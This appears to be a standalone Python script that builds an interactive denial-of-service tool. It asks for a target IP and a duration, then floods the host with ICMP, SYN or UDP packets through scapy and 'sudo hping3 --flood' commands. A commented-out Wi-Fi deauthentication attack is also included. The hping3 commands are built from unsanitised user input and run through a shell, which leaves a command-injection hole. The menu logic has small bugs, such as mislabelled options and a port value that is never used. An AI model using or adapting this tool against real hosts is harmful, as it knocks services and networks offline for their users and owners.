from scapy.all import IP,ICMP,send,TCP,UDP,Raw,sendp,Dot11,RadioTap,Dot11Deauth 
import sys
import subprocess as sb
import time as t

def icmp_dump(ip,duration):
    #this 
    start_time = t.time() 
    icmp_packet = IP(dst=ip)/ICMP()
    print(f"Sending IMCP packets for {duration} secs\nSending...")
    while t.time() - start_time <  duration :
        send(icmp_packet,verbose = False)
    print("Packets Sent!")


# def tcp_dump(ip,duration):

#     start_time = t.time() 
#     tcp_packet = IP(dst=ip)/TCP()
#     print(f"Sending TCP packets for {duration} secs\nSending...")
#     while t.time() - start_time <  duration :
#         send(tcp_packet,verbose = False)
#     print("Packets Sent!")

        
def udp_dump(ip,duration,port,packet_size= 1024):

    start_time = t.time() 
    packet = IP(dst=ip)/UDP(dport=port)/Raw(b"X" * packet_size)
    print(f"Sending TCP packets for {duration} secs\nSending...")
    while t.time() - start_time <  duration :
        send(packet,verbose = False)
    print("Packets Sent!")

def http_dump(ip,duration,port):
    
    start_time = t.time() 
    packet = IP(dst=ip)/TCP(dport=port, flags="S")/Raw(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
    print(f"Sending HTTP packets for {duration} secs\nSending...")
    while t.time() - start_time <  duration :
        send(packet, verbose=False)
    print("Packets Sent!")

# def deauth(target_mac, gateway_mac, interface,duration):
#     # Create deauthentication packet
#     start_time = t.time() 
#     packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)

#     # Send deauth packet continuously
#     print(f"Sending deauth packets to {target_mac} from {gateway_mac}")
#     try:
#         while t.time() - start_time <  duration :
#             sendp(packet, iface=interface, count=100, inter=0.1, verbose=0)
#     except KeyboardInterrupt:
#         print("Attack stopped.")
    
def hping_icmp_flood(ip,duration):
    start_time = t.time() 
    while t.time() - start_time <  duration :
        sb.run(f"sudo hping3 -1 {ip} --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)


def hping_http_flood(ip,duration):
    start_time = t.time() 
    while t.time() - start_time <  duration :
        sb.run(f"sudo hping3 -S {ip} -p 80 --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)

def hping_udp_flood(ip,duration):
    start_time = t.time() 
    while t.time() - start_time <  duration :
        sb.run(f"sudo hping3 --udp {ip} --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)



target_ip = input("Enter the target ip: ")

if target_ip.count('.') == 3:
    dump_time = int(input("Enter the time to dump(seconds): "))
    print("Choose the type of flood attack \n1 : ICMP\n2 : TCP\n3 : UDP\n4: HTTP\n5: Hping")
    choice = int(input(": "))
    if choice ==1 :
        hping_icmp_flood(target_ip,dump_time)
    elif choice == 2:
        hping_http_flood(target_ip,dump_time)
    elif choice == 3:
        port = int(input("Enter the port no: "))
        hping_udp_flood(target_ip,dump_time)
    elif choice == 4:
        hping_http_flood(target_ip,dump_time)
    else:
        port = int(input("Enter the port no: "))
        http_dump(target_ip,dump_time,port)
else:
    print("Invalid IP Address!\nExiting")



